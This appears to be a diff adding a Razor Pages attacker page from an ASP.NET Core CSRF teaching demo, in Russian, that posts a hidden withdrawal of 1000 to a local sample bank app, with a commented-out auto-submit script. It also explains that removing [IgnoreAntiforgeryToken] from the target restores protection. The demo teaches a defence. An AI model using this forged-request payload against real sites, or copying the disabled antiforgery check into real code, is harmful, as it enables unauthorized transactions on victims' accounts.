@@ -1,0 +1,25 @@
+﻿@page
+@model IndexModel
+@{
+    ViewData["Title"] = "Home Page";
+}
+
+<h2>Эта страница автоматически публикует запрос на снятия средств в банковском приложении.</h2>
+<p>Если вы вошли в банковское приложение (и оно работает), то нажатие кнопки ниже украдет 1000 с вашего счете .</p>
+<p> Очень легко отравлять запрос на снятие автоматически при посещении страницы, используя простой фрагмент javascript <code>document.forms[0].submit();</code></p>
+
+<form action="https://localhost:55555/balance" method="POST" asp-antiforgery="false">
+    <input type="hidden" name="amount" value="1000" />
+    <button type="submit" class="btn btn-warning mb-2">Украсть ваши деньги</button>
+</form>
+
+@* Раскомментируйте этот фрагмент для активации автоматической отправки запроса на снятие.
+    <script>
+        document.forms[0].submit();
+    </script>
+*@
+
+<p>
+    По умолчанию Razor Pages защищает сайт от подобных атак. Для активации защиты удалите атрибут <code>[IgnoreAntiforgeryToken]</code> со страницы Razor <code>Balance.cshtml</code>.
+    Форма на этом сайте не сможет сгенерировать действительный токен Antiforgery, поэтому публикация формы будет отклонена с ошибкой 400 Bad Request.
+</p>
